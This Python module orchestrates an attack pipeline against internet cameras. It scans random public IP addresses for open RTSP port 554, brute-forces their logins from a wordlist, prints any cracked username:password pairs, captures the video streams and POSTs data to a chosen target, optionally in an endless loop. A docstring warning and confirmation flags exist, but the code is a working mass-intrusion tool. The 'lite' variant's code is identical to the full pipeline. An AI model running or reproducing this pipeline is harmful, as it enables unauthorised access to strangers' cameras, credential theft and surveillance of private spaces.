"""camdike module — orchestration pipelines (camdike.sh, camdike_lite.sh, camdike_lite_no_brute.sh).

These chain: random RTSP scan -> (optional) brute force -> capture -> POST.
They run in a loop until interrupted.

DANGER: These scan random public IPs and brute-force credentials. Only run
against systems you own or have written authorization to test.
"""

from __future__ import annotations

import asyncio
from pathlib import Path
from typing import Optional

from rich.console import Console

from .fortune import fortune_rtsp as fortune_rtsp_module
from .output import Reporter
from .rtsp import DEFAULT_WORDLIST, rtsp_brute as rtsp_brute_module, rtsp_capture as rtsp_capture_module
from .scope import ScopeError
from .camposter import camposter as camposter_module

console = Console()


async def _run_pipeline(
    *,
    count: int,
    random_internet: bool,
    confirm: bool,
    authorize_brute: bool,
    wordlist: Optional[Path],
    do_brute: bool,
    do_capture: bool,
    do_post: bool,
    post_target: str,
    post_data: Optional[str],
    reporter: Reporter,
) -> None:
    if random_internet and not confirm:
        console.print("[yellow]Aborted.[/yellow]")
        return

    # Step 1: gather IPs with open RTSP port (fortune_rtsp).
    console.print()
    console.print("[bold cyan]Gather IPs[/bold cyan]")
    rtsp_hosts = await fortune_rtsp_module(
        count,
        allow_random=random_internet,
        reporter=reporter,
    )
    hosts = [r["ip"] for r in rtsp_hosts if r.get("port") == 554]
    console.print(f"[green]Found {len(hosts)} hosts with RTSP port 554 open[/green]")

    if not hosts:
        return

    # Step 2: brute force (rtsp_brute).
    brute_hosts: list[str] = []
    if do_brute:
        if not authorize_brute:
            raise ScopeError(
                "--authorize-brute is required for the brute-force step."
            )
        if wordlist is None:
            wordlist = DEFAULT_WORDLIST
        if not wordlist.exists():
            raise ScopeError(f"Wordlist not found: {wordlist}")

        console.print()
        console.print("[bold cyan]Brute[/bold cyan]")
        brute_results = await rtsp_brute_module(
            hosts,
            port=554,
            wordlist=wordlist,
            authorize_brute=True,
            concurrency=50,
            reporter=reporter,
        )
        brute_hosts = [
            r["host"] for r in brute_results if r.get("credentials")
        ]
        console.print(f"[green]Bruted {len(brute_hosts)} hosts[/green]")
        for r in brute_results:
            if r.get("credentials"):
                creds = ", ".join(
                    f"{c['user']}:{c['password']}" for c in r["credentials"]
                )
                console.print(f"  [bold green]{r['host']}:{r['port']}[/bold green] -> {creds}")
    else:
        brute_hosts = hosts
        console.print()
        console.print("[yellow]Skipping brute force[/yellow]")

    # Step 3: capture (rtsp_capture).
    capture_targets = brute_hosts if brute_hosts else hosts
    if do_capture:
        console.print()
        console.print("[bold cyan]Capture[/bold cyan]")
        await rtsp_capture_module(
            capture_targets,
            port=554,
            reporter=reporter,
        )

    # Step 4: POST (camposter).
    if do_post:
        console.print()
        console.print("[bold cyan]Post[/bold cyan]")
        await camposter_module(
            [post_target],
            data=post_data,
            content_type="application/x-www-form-urlencoded",
            concurrency=20,
            timeout=10.0,
            allow_public=True,
            reporter=reporter,
        )


async def camdike_module(
    *,
    count: int,
    random_internet: bool,
    confirm: bool,
    authorize_brute: bool,
    wordlist: Optional[Path],
    post_target: str,
    post_data: Optional[str],
    loop: bool,
    json_out: bool,
    timeout_minutes: Optional[float],
) -> None:
    """Full camdike pipeline: scan -> brute -> capture -> post (camdike.sh)."""
    reporter = Reporter(json_out=json_out)
    try:
        if loop:
            while True:
                await _run_pipeline(
                    count=count,
                    random_internet=random_internet,
                    confirm=confirm,
                    authorize_brute=authorize_brute,
                    wordlist=wordlist,
                    do_brute=True,
                    do_capture=True,
                    do_post=True,
                    post_target=post_target,
                    post_data=post_data,
                    reporter=reporter,
                )
                reporter.summary()
                await asyncio.sleep(5)
        else:
            await _run_pipeline(
                count=count,
                random_internet=random_internet,
                confirm=confirm,
                authorize_brute=authorize_brute,
                wordlist=wordlist,
                do_brute=True,
                do_capture=True,
                do_post=True,
                post_target=post_target,
                post_data=post_data,
                reporter=reporter,
            )
    except ScopeError as exc:
        console.print(f"[red]Scope error:[/red] {exc}")
        raise
    except KeyboardInterrupt:
        pass
    reporter.summary()


async def camdike_lite_module(
    *,
    count: int,
    random_internet: bool,
    confirm: bool,
    authorize_brute: bool,
    wordlist: Optional[Path],
    post_target: str,
    post_data: Optional[str],
    loop: bool,
    json_out: bool,
) -> None:
    """Lite camdike pipeline (camdike_lite.sh)."""
    reporter = Reporter(json_out=json_out)
    try:
        if loop:
            while True:
                await _run_pipeline(
                    count=count,
                    random_internet=random_internet,
                    confirm=confirm,
                    authorize_brute=authorize_brute,
                    wordlist=wordlist,
                    do_brute=True,
                    do_capture=True,
                    do_post=True,
                    post_target=post_target,
                    post_data=post_data,
                    reporter=reporter,
                )
                reporter.summary()
                await asyncio.sleep(5)
        else:
            await _run_pipeline(
                count=count,
                random_internet=random_internet,
                confirm=confirm,
                authorize_brute=authorize_brute,
                wordlist=wordlist,
                do_brute=True,
                do_capture=True,
                do_post=True,
                post_target=post_target,
                post_data=post_data,
                reporter=reporter,
            )
    except ScopeError as exc:
        console.print(f"[red]Scope error:[/red] {exc}")
        raise
    except KeyboardInterrupt:
        pass
    reporter.summary()


async def camdike_lite_no_brute_module(
    *,
    count: int,
    random_internet: bool,
    confirm: bool,
    post_target: str,
    post_data: Optional[str],
    loop: bool,
    json_out: bool,
) -> None:
    """Lite camdike without brute force (camdike_lite_no_brute.sh).

    Still performs random internet scanning, so --random-internet and
    --confirm are required.
    """
    reporter = Reporter(json_out=json_out)
    try:
        if loop:
            while True:
                await _run_pipeline(
                    count=count,
                    random_internet=random_internet,
                    confirm=confirm,
                    authorize_brute=False,
                    wordlist=None,
                    do_brute=False,
                    do_capture=True,
                    do_post=True,
                    post_target=post_target,
                    post_data=post_data,
                    reporter=reporter,
                )
                reporter.summary()
                await asyncio.sleep(5)
        else:
            await _run_pipeline(
                count=count,
                random_internet=random_internet,
                confirm=confirm,
                authorize_brute=False,
                wordlist=None,
                do_brute=False,
                do_capture=True,
                do_post=True,
                post_target=post_target,
                post_data=post_data,
                reporter=reporter,
            )
    except ScopeError as exc:
        console.print(f"[red]Scope error:[/red] {exc}")
        raise
    except KeyboardInterrupt:
        pass
    reporter.summary()
